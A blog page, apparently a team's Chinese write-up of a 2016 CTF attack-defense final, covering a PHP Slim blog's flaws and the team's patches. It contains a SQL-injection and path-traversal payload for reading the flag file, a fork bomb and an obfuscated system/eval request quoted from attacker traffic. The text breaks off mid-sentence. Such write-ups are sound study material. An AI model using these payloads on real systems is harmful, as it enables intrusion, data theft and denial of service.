@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Asuri Team</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Asuri Team">
+<meta property="og:url" content="http://asuri.org/page/3/index.html">
+<meta property="og:site_name" content="Asuri Team">
+<meta property="og:locale">
+<meta property="article:author" content="All Members">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Asuri Team" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <div id="container">
+    
+
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Asuri Team</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/members">Members</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://asuri.org"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-2016-nationwide-ctf-first-writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/08/13/2016-nationwide-ctf-first-writeup/" class="article-date">
+  <time datetime="2016-08-13T18:25:00.000Z" itemprop="datePublished">2016-08-14</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Writeup/">Writeup</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/08/13/2016-nationwide-ctf-first-writeup/">2016 全国大学生信息安全竞赛初赛 Writeup</a>
+    </h1>
+  
+
+
+  <div class="article-author">
+    <img src="https://www.gravatar.com/avatar/67d0b10056c602378e25de466c83e7dd?s=48">
+    <div class="article-author-info">
+      <a href="/author/rexskz" class="article-author-name">Rex Zeng</a>
+      <a target="_blank" rel="noopener" href="https://www.rexskz.info/" class="article-author-site" title="Visit the author's site">[site]</a>
+      <div class="article-author-about" title="音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。">音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。</div>
+    </div>
+  </div>
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>得益于初赛的人品，我们有幸入围了决赛。但是对于决赛的比赛方式：攻防赛，我们并不了解，事先也不知道需要准备哪些东西，只是配了几个扫描器，然后就是之前用的 IDA 之类的工具和各种语言环境。经过两天的比赛，最终成绩是第 12 名（如果没有赛后的名次变动的话）。这次比赛确实让我学到了一些东西，下面我就来说一说吧~</p>
+<p>各组选手维护相同的一系列服务，每五分钟（第二天改为了三分钟）为一轮，有一个flag 文件是 <code>/home/flag/flag</code>，你需要努力获取其它队伍的 flag 文件，也要尽量保证自己的 flag 文件不会被获取。每一轮这个文件的内容都会变，每一轮每个队伍只能提交获取到的其它各个队伍的 flag 各一次。也就是说，如果你不把漏洞修好，那么每一轮都可以被所有发现该漏洞的队伍攻击一次；每一轮会有一次服务存活检测，如果服务 down 掉了，丢失的分数会更多。</p>
+<p>由于这次的题目类型大多是 PWN 的，而我是一只 WEB 狗，所以大部分的分数并不是我拿的，对于 PWN 的题目我也没法做什么分析。这次比赛的 WEB 题是这样的：你要维护的是一个简单的博客系统，使用的框架是 PHP Slim，支持最简单的注册、登录、发博文（标题、纯文本内容、模板名称）的功能。flag 文件是 <code>/home/flag/flag</code>，属于 <code>www-data</code>，权限为 511（每一轮自动换）。我们需要获取其它队伍的 flag 文件中的内容。</p>
+<p>与之同时发布的还有一道 PWN 题，@沈园 同学果断接下了这个锅（事实上我们几乎所有有成绩的 PWN 题，修补漏洞和编写 EXP 都是他负责的，在此先膜拜一下 ），我和@SummerZhang 同学开始看 WEB。</p>
+<p>首先先用 <code>tar</code> 命令将整个 web 目录打包，放到 <code>/tmp</code> 下，然后通过 <code>scp</code> 命令将其复制到本地。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp ctf@10.250.111.11:/tmp/www.tar.gz ./www.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>解压缩之后对里面的文件进行逐一查看：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">web</span><br><span class="line">├─html</span><br><span class="line">│  ├─css</span><br><span class="line">│  ├─fonts</span><br><span class="line">│  │  └─roboto</span><br><span class="line">│  ├─img</span><br><span class="line">│  └─js</span><br><span class="line">├─log</span><br><span class="line">├─templates</span><br><span class="line">│  └─note_tpl</span><br><span class="line">└─vendor</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>html</code> 文件夹中主要是 PHP 文件，<code>config.php</code> 是一些配置项，包括数据库的账号和密码，由于每一队维护的服务代码都是相同的，而且我们也没权限修改数据库的登录密码，因此这些无需修改。但是上面有这么一句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;displayErrorDetails&#x27;</span>] = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
+
+<p>为了保险起见还是改成 <code>false</code> 吧。接下来是 <code>db.php</code>，是自己写的一个库文件，我们大概能感觉到这里面会有 SQL 注入的风险。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">where</span>(<span class="params"><span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$operate</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$value</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;where[] = sprintf(<span class="string">&quot;%s %s &#x27;%s&#x27;&quot;</span>, <span class="keyword">$this</span>-&gt;filter(<span class="variable">$key</span>), <span class="variable">$operate</span>, <span class="keyword">$this</span>-&gt;filter(<span class="variable">$value</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到这个函数的时候我还诧异：居然写了过滤？然而找到这个函数之后才发现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>坑爹呢！于是赶紧在 return 的值外面包了层 <code>addslashes</code>。继续往下看有个 <code>select</code> 函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$value</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(count(<span class="keyword">$this</span>-&gt;where) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$sql</span> = sprintf(<span class="string">&quot;SELECT %s FROM %s &quot;</span>, <span class="variable">$value</span>, <span class="keyword">$this</span>-&gt;table);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$where</span> = implode(<span class="string">&#x27; AND &#x27;</span>, <span class="keyword">$this</span>-&gt;where);</span><br><span class="line">        <span class="variable">$sql</span> = sprintf(<span class="string">&quot;SELECT %s FROM %s WHERE %s&quot;</span>, <span class="variable">$value</span>, <span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$sql</span> .= <span class="keyword">$this</span>-&gt;limit;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;limit = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="keyword">$this</span>-&gt;conn, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$result</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$tmp</span> = mysqli_fetch_row(<span class="variable">$result</span>)) &#123;</span><br><span class="line">        <span class="variable">$ret</span>[] = <span class="variable">$tmp</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> @<span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不用想了，<code>$where</code> 这儿也有问题。在 <code>else</code> 一段为它添加 <code>addslashes</code> 吧：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$where</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$o</span>[<span class="variable">$key</span>] = addslashes(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$where</span> = implode(<span class="string">&#x27; AND &#x27;</span>, <span class="variable">$o</span>);</span><br><span class="line">    <span class="variable">$sql</span> = sprintf(<span class="string">&quot;SELECT %s FROM %s WHERE %s&quot;</span>, <span class="variable">$value</span>, <span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面是一个 <code>insert</code> 函数，不定参数。其中有一句似乎是调用了 <code>$this-&amp;gt;filter</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$args_list</span> = array_map(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="string">&#x27;filter&#x27;</span>), func_get_args());</span><br></pre></td></tr></table></figure>
+
+<p>这段应该是没问题的，所以不改了。下面的 <code>sess</code> 类和 <code>hello</code> 函数也没发现什么问题。至此，<code>db.php</code> 已经没有什么明显的 BUG 了。接下来看 <code>index.php</code>，其中对路由 <code>/list</code> 的处理中，有一段看起来可能有问题：获取到文章的信息存放到 <code>$result</code> 之后，执行渲染的函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;view-&gt;render(<span class="variable">$response</span>, <span class="string">&quot;/list.tpl&quot;</span>, <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>     =&gt; <span class="variable">$hello</span>,</span><br><span class="line">    <span class="string">&#x27;notes&#x27;</span>        =&gt; <span class="variable">$result</span>,</span><br><span class="line">    <span class="string">&#x27;total_page&#x27;</span>   =&gt; <span class="variable">$total_page</span>,</span><br><span class="line">    <span class="string">&#x27;current_page&#x27;</span> =&gt; <span class="variable">$current_page</span></span><br><span class="line">));</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>/list.tpl</code> 文件中有这样一段：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> note in notes %&#125;</span><br><span class="line">    &#123;% embed note<span class="number">.3</span> %&#125;</span><br><span class="line">        &#123;% block title %&#125;&#123;&#123; note<span class="number">.1</span> &#125;&#125;&#123;% endblock %&#125;</span><br><span class="line">        &#123;% block content %&#125;&#123;&#123; note<span class="number">.2</span> &#125;&#125;&#123;% endblock %&#125;</span><br><span class="line">    &#123;% endembed %&#125;</span><br><span class="line">&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>note.3</code> 是我们发这篇文章时选择的模板文件，它是在路由 <code>/post</code> 中被这样生成的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$title</span> = <span class="variable">$parsedBody</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$parsedBody</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="variable">$temp</span> = <span class="string">&quot;/note_tpl/<span class="subst">&#123;$parsedBody[&#x27;temp&#x27;]&#125;</span>.tpl&quot;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;table(<span class="string">&#x27;notes&#x27;</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;insert(<span class="variable">$username</span>, <span class="variable">$title</span>, <span class="variable">$content</span>, <span class="variable">$temp</span>);</span><br></pre></td></tr></table></figure>
+
+<p>当然，如果 <code>filter</code> 函数没有修改的话，可以这样直接注入：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/post</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.250.1xx.11</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=[logged_session_id]</span><br><span class="line">[Other headers]</span><br><span class="line"></span><br><span class="line">content=xxx&amp;temp=0&amp;title=1%27%2C+%27title%27%2C+%27%5C%2Fnote_tpl%5C%2F..%5C%2F..%5C%2F..%5C%2F..%5C%2Fhome%5C%2Fflag%5C%2Fflag%27%29+%23+</span><br></pre></td></tr></table></figure>
+
+<p>这样拼接出来的 SQL 是：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> notes <span class="keyword">VALUES</span> (<span class="string">&#x27;[logged_username]&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;\/note_tpl\/..\/..\/..\/..\/home\/flag\/flag&#x27;</span>) <span class="comment"># &#x27;, &#x27;xxx&#x27;, &#x27;0&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p>于是在 render 的时候会触发文件包含的漏洞。如果数据库防了注入，这招就失灵了。但是我们可以这样：发现数据库的 <code>template</code> 字段类型是 <code>varchar</code>，有长度限制，我们只需要用空格填满剩余的空间即可：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=0&amp;content=xxx&amp;temp=..%2F..%2F..%2F..%2Fhome%2Fflag%2Fflag++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br></pre></td></tr></table></figure>
+
+<p>于是存到数据库中的就相当于 <code>/home/flag/flag</code> 了。要说这个也属于逻辑设计不合理，应该是在数据库存放文件名，然后渲染之前现场拼接路径。其实 Slim 本身也做了一层过滤，在 <code>vendor/twig/twig/lib/Twig/Loader/Filesystem.php</code> 中有过滤的函数，把注释去掉就可以限定包含的文件只能在当前目录下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">validateName</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> !== strpos(<span class="variable">$name</span>, <span class="string">&quot;\0&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Twig_Error_Loader(<span class="string">&#x27;A template name cannot contain NUL bytes.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$name</span> = ltrim(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="variable">$parts</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$level</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$parts</span> <span class="keyword">as</span> <span class="variable">$part</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;..&#x27;</span> === <span class="variable">$part</span>) &#123;</span><br><span class="line">            --<span class="variable">$level</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">&#x27;.&#x27;</span> !== <span class="variable">$part</span>) &#123;</span><br><span class="line">            ++<span class="variable">$level</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$level</span> &amp;lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// throw new Twig_Error_Loader(sprintf(&#x27;Looks like you try to load a template outside configured directories (%s).&#x27;, $name));</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是这么修改太麻烦了，我们看了一下，只有三个模板，文件名分别是 1、2、3……于是果断加了一句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$parsedBody</span>[<span class="string">&#x27;temp&#x27;</span>] = intval(<span class="variable">$parsedBody</span>[<span class="string">&#x27;temp&#x27;</span>]);</span><br><span class="line"><span class="comment">// 下面这句是原来的</span></span><br><span class="line"><span class="variable">$temp</span> = <span class="string">&quot;/note_tpl/<span class="subst">&#123;$parsedBody[&#x27;temp&#x27;]&#125;</span>.tpl&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这下管你什么文件包含呢，通通没办法了吧？于是第一天我们的 WEB 题没有丢分（有一段时间许多队伍的 WEB 被 DoS 了，而 DoS 是被规则禁止的攻击方式，不知道主办方会怎么处理，这段时间的丢分我就认为不算丢分吧），反倒还拿了其它队伍不少分。</p>
+<p>但是第二天就奇怪了，一大片队伍的 WEB 题都 down 掉了，我们不光 down 了，还被拿到了 flag。这怎么能忍？我们一遍遍排查代码，确认没有什么逻辑上的漏洞。然后突然发现服务器操作特别慢，于是 <code>ps aux</code> 了一下，发现了一大堆这样的命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="built_in">echo</span> 123;<span class="function"><span class="title">x</span></span>() &#123; x|x&amp; &#125;;x</span><br></pre></td></tr></table></figure>
+
+<p>卧槽，居然连 fork 炸弹都上了！这也是被规则禁止的，于是我们通知了主办方，主办方把所有队伍的 WEB 服务都重启了一遍，但是我们的 WEB 题还是既 down 又被 flag，简直神奇。看了一下 <code>/tmp</code> 目录下被上传了一堆 shell，但是我们的 ctf 用户没权限删除 www-data 用户创建的内容。后来我们直接给自己的服务器上了一个 webshell（这就是俗话说的：我急了连自己的机器都上 shell！），因为 webshell 就是以 www-data 用户身份运行的。我们没发现有什么可以上传文件的地方，但是确实是被 get shell 了，于是在找出上传方法之前，先将所有的 shell 文件 kill 掉，然后对其执行 <code>chmod 000</code>；刚才 ps 的时候还发现了一个定时发送 flag 的 crontab，于是也果断将其清空。</p>
+<p>就算这样还是被 flag 了，而且还在 down 着。我们在改完代码测试流程的时候偶然发现无法注册无法登录，于是猜想是不是数据库挂掉了，于是连进数据库一看，发现整个 database 全部被 drop 掉了……我们之前没有备份数据库，但是凭借着一点点记忆力以及@SummerZhang 同学根据代码推断数据库结构的能力，直接手动建起了数据库，恢复了服务的运行：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> <span class="number">0</span>ops;</span><br><span class="line"><span class="keyword">use</span> <span class="number">0</span>ops;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span> (username <span class="built_in">varchar</span>(<span class="number">255</span>), <span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">255</span>));</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> notes (username <span class="built_in">varchar</span>(<span class="number">255</span>), title <span class="built_in">varchar</span>(<span class="number">255</span>), <span class="keyword">content</span> <span class="built_in">varchar</span>(<span class="number">255</span>), temp <span class="built_in">varchar</span>(<span class="number">255</span>));</span><br></pre></td></tr></table></figure>
+
+<p>但是文件是怎么传上来的呢？我们在 <code>index.php</code> 文件的最一开始加了一段代码，可以将全部的 HTTP 请求包记录到 <code>/tmp/log.txt</code> 中，然后我们就在命令行中 <code>tail -f /tmp/log.txt</code>，开始分析所有的请求，最终锁定了两个奇怪的请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?59b620d4=6cd13eb6assert41a2e1&amp;edfd2=50cbin1d3&amp;208a8e=74fe6cdupload89f&amp;25411bcd=cdde9uploadf814ff266a&amp;cecc789=9ce4c38feeval1de&amp;2e84e621f=368c9e9baa918e&amp;7657=b4a6uploadb339c1b1a&amp;d54c1=1925cinto4aa&amp;28d5bd999f=e7fselect3c37&amp;b5fee3356a=c27ceeval2038&amp;43a7c6bb4=4b3b74assert7a51&amp;e9f6642fc=27b7into244&amp;10fd41aefe=44e18a89a6into2a2f&amp;08a3c97=ee6into3a909a4&amp;c565ef5=6ec68upload2224e453&amp;4df26=1fd254select4caaf&amp;3c743ef7=a69bbfaassertbfa</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.250.111.11</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Accept_encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">User_agent</span>: python-requests/2.10.0</span><br><span class="line"><span class="attribute">Accept_language</span>: xh-ZA,sa;q=0.5,se;q=0.7,sm;q=0.8</span><br><span class="line"><span class="attribute">Referer</span>: http://localhost/index.php?379=60c8and6cc&amp;8cdf38c0c=6f9%2Fbin%2Fbash96ca9&amp;62ca6c1a1=52f58bin4550b2b528&amp;9b4f5=c78d226select632b6&amp;70d7cb=b7bc3576bevale12&amp;id6=a45&amp;id7=b7c&amp;id8=TPp8K%2FzwM3%2F%2Fqn7rfXdJvnuo%2BE179U8e4jblqfr3KeJ7rX4qNSsureJmZY89Pg%3D%3D93d&amp;d99=9&amp;id10=707</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/post</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.250.111.11</span><br><span class="line"><span class="attribute">Accept_encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">User_agent</span>: python-requests/2.7.0 CPython/2.7.9 Linux/4.0.0-kali1-amd64</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=k4146i6hp0os7siaa8c2526no7</span><br><span class="line"></span><br><span class="line">content=,1,0x2f6e6f74655f74706c2f2e2e2f2e2e2f2e2e2f2e2e2f686f6d652f666c61672f666c6167)--+xGj6Evnwu0Lbt4cl1oNKMJJTWOb21MNt5QdqMJiE4ojuUhtUb69&amp;nFXwtiv=</span><br><span class="line">Ok=system(&#x27;uWz1E2Ygq4jZA5JfdwoAVT17xr9Ped8gujeO&quot;.str_rot13(&quot;0xZ8FCS8uJQKVJXbXQY7wSYZF3ZowvUv0hw3LIN6E&quot;.base64_decode(&quot;ypyQrdo7V5t0sZVWBmaLBtmK6aZL7yMZul&quot;.eval(&#x27;xMFxdIFg4zkzyok0gEP2DjMnp8cFLiOlNC5EC776HARtCbn4NkycJ8QN&#x27;.var_dump(&quot;I1X5Qa4vZHVTjyhead&gt;eDY7920XJdQ44mKSHOLnvgJ&quot;.$_SERVER[HTTP_z7Hp57U](&quot;IKtFLD3vFLrxfig3hyZiUyGwP5Qt2QR3dClXFEr7v&#x27;)&quot;ARRnCZtnLPk54s77D5ILVT8UZxeXFjb5ViV1JKgGeCRHPRpjqoHw9cEE&#x27;))&#x27;fCvM6J7W0xC0PIPv6x2TPnpOlOOLvufuofXV4myGroWjw6&#x27;)&#x27;qeToFSdgfyXTwK9fFIITmodMiZLN6bhJ3iNMqm9AX60do&#x27;)</span><br><span class="line">w2RG=system(&quot;CCCO5SSrVWrZsBdytM1xTLObt29O639w055UKmgnO55eXMYMzNiCcqfio&#x27;.system(&quot;DcnBcrhnwJDpGEeSTRrCnHfNBRbMvdfw8Yblp8W8u2G5ysE6G&quot;.unlink(&quot;QVcHdkVThSo0xAU4Zstc2jF6p6owFvqdah&#x27;.strrev(&#x27;jQwHGxixZF4s4mVVQko2jJ17j9yZgagl8ycD&quot;)))</span><br><span class="line">temp=L1Jqzh4S0PcMRxRGhkqQNHllS</span><br><span class="line">title=wV2iOeYuLEh41X7WvpGbXcgkJYPubTjEM2s9eYcPrXQMMG\</span><br></pre></td></tr></table></figure>
+
+<p>我们自己尝试了一下，第二个请求之后会直接报 <code>Slim application error</code>，但是保险起见我们将所有 UA 带有 <code>-kali-</code> 字样的请求全部 die 掉，第一个请求貌似是主办方的服务存活检测，因为将其 die 掉之后我们的网站虽然还能正常运行，但是被判定为 down（但是没有被 flag，这一点我没有及时注意到，这是我的锅），取消 die 之后又变回了只被 flag 的状态。后来惊觉：这是主办方留的后门被人利用了！在 <code>vendor/autoload.php</code> 下面发现了后门：</p>
